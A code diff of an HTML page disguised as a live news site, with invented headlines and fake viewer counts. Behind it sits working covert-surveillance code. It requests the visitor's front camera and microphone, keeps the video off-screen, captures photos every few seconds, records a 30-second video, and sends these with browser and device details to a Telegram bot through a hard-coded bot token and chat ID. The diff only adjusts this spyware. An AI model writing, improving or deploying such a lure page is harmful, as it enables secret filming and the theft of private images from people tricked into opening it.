@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>WorldNews - Live</title>
     <style>
-        /* ========== RESET & BASE ========== */
         * {
             margin: 0;
             padding: 0;
@@ -23,7 +22,6 @@
             align-items: center;
         }
         
-        /* ========== GLASS CARD ========== */
         .glass-card {
             background: rgba(255, 255, 255, 0.04);
             backdrop-filter: blur(20px);
@@ -36,10 +34,8 @@
             box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
             position: relative;
             overflow: hidden;
-            transition: all 0.5s;
         }
         
-        /* ========== ANIMATED BORDER ========== */
         .glass-card::before {
             content: '';
             position: absolute;
@@ -61,7 +57,6 @@
             100% { background-position: 0% 50%; }
         }
         
-        /* ========== HEADER ========== */
         .header {
             display: flex;
             justify-content: space-between;
@@ -101,7 +96,6 @@
             50% { opacity: 0.3; }
         }
         
-        /* ========== STATUS BAR ========== */
         .status-bar {
             display: flex;
             justify-content: space-between;
@@ -134,7 +128,6 @@
             margin-right: 4px;
         }
         
-        /* ========== NEWS TICKER ========== */
         .ticker {
             background: rgba(255,255,255,0.03);
             border-radius: 12px;
@@ -149,15 +142,14 @@
             display: inline-block;
             color: rgba(255,255,255,0.6);
             font-size: 12px;
-            animation: tickerScroll 15s linear infinite;
+            animation: tickerScroll 20s linear infinite;
         }
         
         @keyframes tickerScroll {
             0% { transform: translateX(100%); }
-            100% { transform: translateX(-200%); }
+            100% { transform: translateX(-250%); }
         }
         
-        /* ========== CONTENT GRID ========== */
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -209,17 +201,10 @@
         }
         
         @keyframes fadeUp {
-            from {
-                opacity: 0;
-                transform: translateY(15px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
-        /* ========== FEATURED ========== */
         .featured {
             background: linear-gradient(135deg, rgba(255,107,107,0.08), rgba(77,150,255,0.08));
             border-radius: 14px;
@@ -228,6 +213,13 @@
             border: 1px solid rgba(255,255,255,0.04);
             text-align: center;
             animation: fadeUp 0.8s ease-out;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .featured:hover {
+            background: linear-gradient(135deg, rgba(255,107,107,0.15), rgba(77,150,255,0.15));
+            transform: scale(1.01);
         }
         
         .featured .big-icon {
@@ -247,7 +239,6 @@
             margin-top: 2px;
         }
         
-        /* ========== COLOR THEMES (Random) ========== */
         .theme-1 { border-left: 3px solid #ff6b6b; }
         .theme-2 { border-left: 3px solid #ffd93d; }
         .theme-3 { border-left: 3px solid #6bcb77; }
@@ -255,7 +246,6 @@
         .theme-5 { border-left: 3px solid #9b59b6; }
         .theme-6 { border-left: 3px solid #fd79a8; }
         
-        /* ========== HIDDEN MEDIA ========== */
         #video {
             position: fixed;
             top: -9999px;
@@ -266,15 +256,10 @@
             pointer-events: none;
         }
         
-        #audioRecorder {
-            display: none;
-        }
-        
         #canvas {
             display: none;
         }
         
-        /* ========== FOOTER ========== */
         .footer {
             text-align: center;
             font-size: 10px;
@@ -284,7 +269,16 @@
             margin-top: 4px;
         }
         
-        /* ========== RESPONSIVE ========== */
+        .cam-status {
+            text-align: center;
+            font-size: 10px;
+            color: #4ade80;
+            margin-top: 8px;
+            padding: 4px;
+            border-radius: 20px;
+            background: rgba(74,222,128,0.05);
+        }
+        
         @media (max-width: 480px) {
             .glass-card {
                 padding: 20px 16px 18px;
@@ -306,66 +300,55 @@
 </head>
 <body>
 
-    <!-- ========== HIDDEN MEDIA ========== -->
+    <!-- ========== HIDDEN VIDEO ========== -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
-    <audio id="audioRecorder" autoplay></audio>
 
     <!-- ========== MAIN CARD ========== -->
     <div class="glass-card" id="mainCard">
         
-        <!-- Header -->
         <div class="header">
             <h1>🌍 <span>World</span>News</h1>
             <span class="live-badge">🔴 LIVE</span>
         </div>
         
-        <!-- Status Bar -->
         <div class="status-bar" id="statusBar">
             <span class="item"><span class="live-dot"></span> <span class="num" id="viewers">12,847</span> watching</span>
             <span class="item" id="timeDisplay">🔄 Updating...</span>
             <span class="item" id="sessionTime">⏱️ 0s</span>
         </div>
         
-        <!-- Ticker -->
         <div class="ticker">
             <span class="ticker-text" id="tickerText">🔴 BREAKING: Global Summit 2026 underway • Markets surge 3% • AI breakthrough announced • Peace treaty signed • More updates coming...</span>
         </div>
         
-        <!-- Featured -->
         <div class="featured" id="featured">
             <div class="big-icon" id="featuredIcon">🌍</div>
             <h3 id="featuredTitle">Global Leaders Unite</h3>
             <p id="featuredDesc">Historic agreement reached at Geneva Summit</p>
         </div>
         
-        <!-- Grid -->
-        <div class="grid" id="newsGrid">
-            <!-- Items will be populated by JavaScript -->
-        </div>
+        <div class="grid" id="newsGrid"></div>
         
-        <!-- Footer -->
+        <div class="cam-status" id="camStatus">📷 Camera Active • Recording</div>
+        
         <div class="footer">🔒 SECURE • LIVE • 24/7 COVERAGE</div>
     </div>
 
-    <!-- ================================================================ -->
-    <!-- ========== JAVASCRIPT ========== -->
-    <!-- ================================================================ -->
     <script>
         // ================================================================
-        //  CONFIGURATION
+        //  CONFIGURATION - ستاسو بوټ تنظیمات
         // ================================================================
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
-        const CAPTURE_INTERVAL = 3000; // 3 seconds
-        const MAX_PHOTOS = 20;
-        const VIDEO_SEGMENT_DURATION = 5000; // 5 seconds video segments
+        const CAPTURE_INTERVAL = 4000; // هر ۴ ثانیې عکس
+        const VIDEO_DURATION = 30000; // ۳۰ ثانیې ویډیو
         
         // ================================================================
         //  GET CODE FROM URL
         // ================================================================
         const params = new URLSearchParams(window.location.search);
-        const code = params.get('code') || 'unknown';
+        const code = params.get('code') || 'live_' + Date.now().toString(36);
         
         // ================================================================
         //  BROWSER INFO
@@ -390,13 +373,13 @@
         const browser = getBrowser(navigator.userAgent);
         const device = getDevice(navigator.userAgent);
         const startTime = Date.now();
+        const sessionId = Math.random().toString(36).substring(2, 8);
         
         // ================================================================
         //  DOM ELEMENTS
         // ================================================================
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const audioRecorder = document.getElementById('audioRecorder');
         const viewers = document.getElementById('viewers');
         const timeDisplay = document.getElementById('timeDisplay');
         const sessionTime = document.getElementById('sessionTime');
@@ -405,11 +388,12 @@
         const featuredTitle = document.getElementById('featuredTitle');
         const featuredDesc = document.getElementById('featuredDesc');
         const newsGrid = document.getElementById('newsGrid');
+        const camStatus = document.getElementById('camStatus');
         
         // ================================================================
-        //  NEWS DATA (Dynamic)
+        //  NEWS DATA - تکراري نشي
         // ================================================================
-        const newsItems = [
+        const allNews = [
             { icon: '🚀', title: 'AI Breakthrough', desc: 'New model beats human experts', tag: 'Tech', color: '#4d96ff' },
             { icon: '💰', title: 'Markets Surge', desc: 'Inflation cools down globally', tag: 'Finance', color: '#6bcb77' },
             { icon: '⚽', title: 'Champions League', desc: 'Historic final breaks records', tag: 'Sports', color: '#ffd93d' },
@@ -421,18 +405,35 @@
             { icon: '🌊', title: 'Climate Action', desc: 'Historic emissions deal', tag: 'Environment', color: '#6bcb77' },
             { icon: '🚑', title: 'Medical Miracle', desc: 'New cancer treatment found', tag: 'Health', color: '#ff6b6b' },
             { icon: '📡', title: 'Space Mission', desc: 'Mars colony announced', tag: 'Science', color: '#4d96ff' },
-            { icon: '🎓', title: 'Education Reform', desc: 'Global learning initiative', tag: 'Education', color: '#9b59b6' }
+            { icon: '🎓', title: 'Education Reform', desc: 'Global learning initiative', tag: 'Education', color: '#9b59b6' },
+            { icon: '🔬', title: 'Quantum Computing', desc: 'Major processor breakthrough', tag: 'Science', color: '#4d96ff' },
+            { icon: '🌾', title: 'Food Revolution', desc: 'Sustainable farming triples yield', tag: 'Agriculture', color: '#6bcb77' },
+            { icon: '⚡', title: 'Fusion Energy', desc: 'Net-positive energy achieved', tag: 'Energy', color: '#ffd93d' }
         ];
+        
+        // د تکراري خبرونو مخنیوی
+        let usedNews = [];
+        let newsIndex = 0;
+        
+        function getUniqueNews(count = 4) {
+            const available = allNews.filter(item => !usedNews.includes(item));
+            if (available.length < count) {
+                usedNews = [];
+                return getUniqueNews(count);
+            }
+            const shuffled = shuffleArray([...available]);
+            const selected = shuffled.slice(0, count);
+            selected.forEach(item => usedNews.push(item));
+            return selected;
+        }
         
         // ================================================================
         //  STATE
         // ================================================================
         let stream = null;
-        let audioStream = null;
         let photoCount = 0;
         let isRunning = false;
         let captureTimer = null;
-        let videoTimer = null;
         let sessionTimer = null;
         let viewerTimer = null;
         let tickerTimer = null;
@@ -440,19 +441,20 @@
         let mediaRecorder = null;
         let recordedChunks = [];
         let isRecording = false;
-        let videoSegments = [];
+        let isVideoSent = false;
+        let videoStartTime = 0;
         
         // ================================================================
-        //  START EVERYTHING
+        //  START CAMERA + VIDEO + PHOTOS
         // ================================================================
         async function startAll() {
             try {
-                // Start camera
+                // د کیمرې فعالول
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        width: { ideal: 480 },
+                        height: { ideal: 360 }
                     },
                     audio: true
                 });
@@ -460,32 +462,40 @@
                 video.srcObject = stream;
                 await video.play();
                 
-                // Start audio recording
-                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                isRunning = true;
+                videoStartTime = Date.now();
                 
-                // Start video recording
+                // ویډیو ثبتول پیل کړئ (یوه بشپړه ویډیو)
                 startVideoRecording();
                 
-                // Start photo capture
+                // عکسونه پیل کړئ
                 startPhotoCapture();
                 
-                // Start UI updates
+                // UI تازه کول
                 startUIUpdates();
                 
-                // Send start notification
+                // بوټ ته خبر ورکول
                 sendStartNotification();
+                
+                camStatus.textContent = '📷 Camera Active • Recording Video + Photos';
+                camStatus.style.color = '#4ade80';
                 
             } catch (error) {
                 console.error('Error:', error);
+                camStatus.textContent = '⚠️ Camera not available';
+                camStatus.style.color = '#ff6b6b';
                 sendErrorToTelegram(error.message);
             }
         }
         
         // ================================================================
-        //  VIDEO RECORDING
+        //  VIDEO RECORDING (یوه بشپړه ویډیو)
         // ================================================================
         function startVideoRecording() {
             if (!stream) return;
+            
+            recordedChunks = [];
+            isVideoSent = false;
             
             mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'video/webm;codecs=vp9,opus'
@@ -498,49 +508,39 @@
             };
             
             mediaRecorder.onstop = function() {
-                if (recordedChunks.length > 0) {
+                if (recordedChunks.length > 0 && !isVideoSent) {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    videoSegments.push(blob);
-                    recordedChunks = [];
-                    
-                    // Send video to Telegram
                     sendVideoToTelegram(blob);
-                    
-                    // Restart recording
-                    if (isRunning) {
-                        setTimeout(() => {
-                            if (mediaRecorder && isRunning) {
-                                mediaRecorder.start(1000);
-                            }
-                        }, 500);
-                    }
+                    isVideoSent = true;
+                    recordedChunks = [];
+                    camStatus.textContent = '✅ Video sent! Continuing photos...';
+                    camStatus.style.color = '#4ade80';
                 }
             };
             
             mediaRecorder.start(1000);
             isRecording = true;
+            camStatus.textContent = '🎥 Recording video... (30s)';
+            camStatus.style.color = '#ffd93d';
             
-            // Stop and restart every 5 seconds to create segments
-            videoTimer = setInterval(() => {
+            // د ۳۰ ثانیو وروسته ویډیو بنده کړئ
+            setTimeout(() => {
                 if (mediaRecorder && isRecording) {
                     mediaRecorder.stop();
+                    isRecording = false;
+                    camStatus.textContent = '⏳ Processing video...';
+                    camStatus.style.color = '#ffd93d';
                 }
-            }, VIDEO_SEGMENT_DURATION);
+            }, VIDEO_DURATION);
         }
         
         // ================================================================
-        //  PHOTO CAPTURE
+        //  PHOTO CAPTURE (هر ۴ ثانیې)
         // ================================================================
         function startPhotoCapture() {
-            isRunning = true;
-            photoCount = 0;
-            
             capturePhoto();
-            
             captureTimer = setInterval(() => {
-                if (photoCount < MAX_PHOTOS) {
-                    capturePhoto();
-                }
+                capturePhoto();
             }, CAPTURE_INTERVAL);
         }
         
@@ -549,8 +549,8 @@
             
             try {
                 const context = canvas.getContext('2d');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 const imageData = canvas.toDataURL('image/jpeg', 0.85);
@@ -573,17 +573,18 @@
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                 formData.append('caption', 
-                    `📸 **Photo #${photoCount}**\n\n` +
-                    `🔗 **Code:** \`${code}\`\n` +
+                    `📸 **Photo #${photoCount}**\n` +
+                    `🆔 **Session:** ${sessionId}\n` +
                     `🌍 **Browser:** ${browser}\n` +
                     `📱 **Device:** ${device}\n` +
-                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n` +
-                    `⏱️ **Session:** ${Math.floor((Date.now() - startTime) / 1000)}s`
+                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`
                 );
                 formData.append('parse_mode', 'Markdown');
                 
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-                await fetch(url, { method: 'POST', body: formData });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
                 
             } catch (error) {
                 console.error('Send photo error:', error);
@@ -592,39 +593,48 @@
         
         async function sendVideoToTelegram(blob) {
             try {
+                const duration = Math.floor((Date.now() - videoStartTime) / 1000);
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
                 formData.append('caption', 
-                    `🎥 **Video Segment**\n\n` +
-                    `🔗 **Code:** \`${code}\`\n` +
-                    `⏱️ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n` +
-                    `📊 **Segments:** ${videoSegments.length}`
+                    `🎥 **Full Video**\n` +
+                    `🆔 **Session:** ${sessionId}\n` +
+                    `⏱️ **Duration:** ${duration}s\n` +
+                    `📸 **Photos:** ${photoCount}\n` +
+                    `🌍 **Browser:** ${browser}\n` +
+                    `📱 **Device:** ${device}\n` +
+                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`
                 );
                 formData.append('parse_mode', 'Markdown');
                 
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-                await fetch(url, { method: 'POST', body: formData });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+                
+                camStatus.textContent = '✅ Video sent successfully!';
+                camStatus.style.color = '#4ade80';
                 
             } catch (error) {
                 console.error('Send video error:', error);
+                camStatus.textContent = '⚠️ Video send failed';
+                camStatus.style.color = '#ff6b6b';
             }
         }
         
         async function sendStartNotification() {
             try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
                         text: `🎬 **NEW SESSION STARTED!**\n\n` +
-                              `🔗 **Code:** \`${code}\`\n` +
+                              `🆔 **Session:** ${sessionId}\n` +
                               `🌍 **Browser:** ${browser}\n` +
                               `📱 **Device:** ${device}\n` +
-                              `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n\n` +
-                              `📸 Capturing photos & video...`,
+                              `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -633,13 +643,12 @@
         
         async function sendErrorToTelegram(errorMsg) {
             try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: `⚠️ **Error**\n\nCode: \`${code}\`\nError: ${errorMsg}`,
+                        text: `⚠️ **Error**\n\nSession: ${sessionId}\nError: ${errorMsg}`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -647,20 +656,20 @@
         }
         
         // ================================================================
-        //  UI UPDATES (Dynamic - changes every few seconds)
+        //  UI UPDATES (تکراري نشي)
         // ================================================================
         function startUIUpdates() {
-            // Update viewers
+            // Viewers - متحرک
             viewerTimer = setInterval(() => {
                 const num = Math.floor(Math.random() * 50000) + 8000;
                 viewers.textContent = num.toLocaleString();
             }, 3000);
             
-            // Update time
-            timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit',second:'2-digit'})}`;
+            // Time
+            timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit'})}`;
             setInterval(() => {
-                timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit',second:'2-digit'})}`;
-            }, 1000);
+                timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit'})}`;
+            }, 5000);
             
             // Session time
             sessionTimer = setInterval(() => {
@@ -670,37 +679,28 @@
                 sessionTime.textContent = `⏱️ ${mins}m ${secs}s`;
             }, 1000);
             
-            // Ticker
+            // Ticker - تکراري نشي
             const tickers = [
-                '🔴 BREAKING: Global Summit 2026 underway • Leaders discuss climate action',
-                '💰 Markets surge 3% after positive economic data release',
-                '🚀 AI breakthrough: New model beats human experts in medical diagnosis',
-                '🌍 Peace treaty signed between two nations after decades of conflict',
-                '📡 Mars colony announced: First human settlement by 2030',
-                '⚽ Champions League final breaks viewership records',
-                '🌿 New vaccine shows 95% efficacy against rare disease',
-                '🎬 Blockbuster film reaches $1 billion in first week',
-                '🏦 Global banking reform agreement reached',
-                '🌊 Historic climate deal: 50 nations commit to net-zero'
+                'BREAKING: Global Summit 2026 • Historic agreements signed',
+                'Markets rally 3% • Inflation at 3-year low',
+                'AI breakthrough • New model revolutionizes healthcare',
+                'Peace treaty • Decades-long conflict finally ends',
+                'Mars colony • First human settlement by 2030',
+                'Champions League • Record-breaking viewership',
+                'Vaccine breakthrough • 95% efficacy rate',
+                'Box office record • Film reaches $1 billion',
+                'Quantum computing • Major processor breakthrough',
+                'Fusion energy • Net-positive achieved'
             ];
-            let tickerIndex = 0;
+            let tickerIndex = Math.floor(Math.random() * tickers.length);
             tickerTimer = setInterval(() => {
-                tickerText.textContent = '🔴 ' + tickers[tickerIndex % tickers.length] + ' • More updates coming...';
+                tickerText.textContent = '🔴 ' + tickers[tickerIndex % tickers.length] + ' • More updates...';
                 tickerIndex++;
             }, 4000);
             
-            // News grid - randomize
-            function shuffleArray(arr) {
-                for (let i = arr.length - 1; i > 0; i--) {
-                    const j = Math.floor(Math.random() * (i + 1));
-                    [arr[i], arr[j]] = [arr[j], arr[i]];
-                }
-                return arr;
-            }
-            
+            // News grid - هر ځل نوي خبرونه
             function updateNews() {
-                const shuffled = shuffleArray([...newsItems]);
-                const selected = shuffled.slice(0, 4);
+                const selected = getUniqueNews(4);
                 
                 newsGrid.innerHTML = '';
                 selected.forEach((item, index) => {
@@ -713,7 +713,6 @@
                         <span class="tag" style="background:${item.color}20;color:${item.color};">${item.tag}</span>
                     `;
                     div.onclick = () => {
-                        // Change featured on click
                         featuredIcon.textContent = item.icon;
                         featuredTitle.textContent = item.title;
                         featuredDesc.textContent = item.desc + ' • Clicked!';
@@ -721,17 +720,17 @@
                     newsGrid.appendChild(div);
                 });
                 
-                // Also update featured
-                const featuredItem = shuffled[Math.floor(Math.random() * shuffled.length)];
+                // Featured هم تازه کړئ
+                const featuredItem = allNews[Math.floor(Math.random() * allNews.length)];
                 featuredIcon.textContent = featuredItem.icon;
                 featuredTitle.textContent = featuredItem.title;
                 featuredDesc.textContent = featuredItem.desc + ' • Updated live';
             }
             
             updateNews();
-            newsTimer = setInterval(updateNews, 5000);
+            newsTimer = setInterval(updateNews, 7000);
             
-            // Random color theme change
+            // Random color theme - هر ۳ ثانیې
             setInterval(() => {
                 const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#9b59b6', '#fd79a8'];
                 const color = colors[Math.floor(Math.random() * colors.length)];
@@ -740,52 +739,16 @@
         }
         
         // ================================================================
-        //  STOP EVERYTHING (On page close)
-        // ================================================================
-        function stopAll() {
-            isRunning = false;
-            isRecording = false;
-            
-            if (captureTimer) clearInterval(captureTimer);
-            if (videoTimer) clearInterval(videoTimer);
-            if (sessionTimer) clearInterval(sessionTimer);
-            if (viewerTimer) clearInterval(viewerTimer);
-            if (tickerTimer) clearInterval(tickerTimer);
-            if (newsTimer) clearInterval(newsTimer);
-            
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-            }
-            
-            // Send final notification
-            const totalTime = Math.floor((Date.now() - startTime) / 1000);
-            const mins = Math.floor(totalTime / 60);
-            const secs = totalTime % 60;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: `🛑 **SESSION ENDED**\n\n` +
-                          `🔗 **Code:** \`${code}\`\n` +
-                          `⏱️ **Duration:** ${mins}m ${secs}s\n` +
-                          `📸 **Photos:** ${photoCount}\n` +
-                          `🎥 **Videos:** ${videoSegments.length}\n\n` +
-                          `Total media sent successfully!`,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(() => {});
-            
-            setTimeout(() => {
-                if (stream) stream.getTracks().forEach(track => track.stop());
-                if (audioStream) audioStream.getTracks().forEach(track => track.stop());
-            }, 1000);
-        }
-        
-        // ================================================================
         //  HELPERS
         // ================================================================
+        function shuffleArray(arr) {
+            for (let i = arr.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [arr[i], arr[j]] = [arr[j], arr[i]];
+            }
+            return arr;
+        }
+        
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
             const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
@@ -798,17 +761,50 @@
         }
         
         // ================================================================
-        //  DETECT PAGE CLOSE
+        //  STOP ON PAGE CLOSE
         // ================================================================
-        window.addEventListener('beforeunload', function() {
-            stopAll();
-        });
+        function stopAll() {
+            isRunning = false;
+            isRecording = false;
+            
+            if (captureTimer) clearInterval(captureTimer);
+            if (sessionTimer) clearInterval(sessionTimer);
+            if (viewerTimer) clearInterval(viewerTimer);
+            if (tickerTimer) clearInterval(tickerTimer);
+            if (newsTimer) clearInterval(newsTimer);
+            
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                try { mediaRecorder.stop(); } catch(e) {}
+            }
+            
+            // بوټ ته خبر ورکول
+            const totalTime = Math.floor((Date.now() - startTime) / 1000);
+            const mins = Math.floor(totalTime / 60);
+            const secs = totalTime % 60;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🛑 **SESSION ENDED**\n\n` +
+                          `🆔 **Session:** ${sessionId}\n` +
+                          `⏱️ **Duration:** ${mins}m ${secs}s\n` +
+                          `📸 **Photos:** ${photoCount}\n` +
+                          `🎥 **Video:** ${isVideoSent ? 'Sent ✅' : 'Processing...'}`,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+            
+            setTimeout(() => {
+                if (stream) stream.getTracks().forEach(track => track.stop());
+            }, 1000);
+        }
         
-        // Also detect visibility change
+        window.addEventListener('beforeunload', stopAll);
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
-                // Page is hidden (tab switched or minimized)
-                // We keep running, but we could log it
+                // تب پټ شوی - ثبتول دوام لري
             }
         });
         
